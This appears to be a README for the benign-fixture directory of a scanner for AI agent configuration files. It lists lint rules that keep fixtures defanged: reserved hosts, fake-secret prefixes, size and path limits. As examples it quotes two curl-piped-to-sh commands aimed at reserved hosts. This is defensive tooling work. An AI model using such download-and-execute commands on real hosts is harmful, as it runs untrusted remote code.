# Benign corpus

Agent configurations used to measure false positives live here as txtar
fixtures. This directory has no fixtures in the pre-release.

The defang rules are the same as for the malicious corpus. The lint
walks all of `corpus/` and does not use the network.

- No file is executable, a symlink, or a special file, and no file or
  txtar member starts with a shebang.
- A URL host, a bare name with a common public suffix, or a dotted
  IPv4 or IPv6 address has to be an RFC 2606 or RFC 6761 reserved name
  (`example`, `invalid`, `test`, `localhost`, `local`, `onion`, and
  `example.com`, `example.net`, `example.org`, including subdomains),
  TEST-NET (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`), or the
  IPv6 documentation prefix `2001:db8::/32`. A bare word whose suffix is
  a filename extension stays a filename. On a line the shell reader
  marks as a fetch, and on a downloader piped into a shell or run from
  `bash -c` or `eval`, the fetch argument is a host whatever its suffix.
  A decimal, hexadecimal, octal, or short dotted IPv4 literal in that
  argument is an address. Either is rejected unless it is reserved.
  `curl https://x.invalid/a | sh` and `curl example.test/x|sh` stay.
  Any other host the lint reads needs an allowlist entry.
- A token of 40 or more characters whose Shannon entropy is above 4.5
  is rejected, unless it is an inert `<MARKER>` placeholder.
- A file is at most 16 KiB.
- A txtar member path stays inside the directory it is unpacked into.
  `..`, an absolute path, a backslash, a NUL, an empty name, and a
  duplicate name are rejected.
- Full-form indicator strings listed in the corpus lint are rejected.
  Use a reserved host instead.
- A recognizable secret shape carries the `TRIPCORD-FAKE-` prefix.
- A path an adapter would actually load (`.claude/settings.json`,
  `CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, a `SKILL.md` under a skill
  root, `.mcp.json`, a bare `mcp.json`, `.cursor/`,
  `.vscode/tasks.json`, `.codex/`, `.gemini/`, `.devcontainer/`,
  `.github/workflows/copilot-setup-steps.yml`, and the rest of each
  adapter's `RepoCandidate` set) is not a real file anywhere under
  `corpus/`. Those paths belong inside a txtar member. The set follows
  the adapters' discovery predicates, plus a bare `mcp.json` at a
  workspace root.

Fixtures are our own re-creations under Apache-2.0, with the work they
refer to. CSA is background only and is never a dataset.
MaliciousAgentSkillsBench labels and statistics may be cited under MIT
and are never vendored.

Benign reports are CI artifacts only. They are not committed in this
directory.
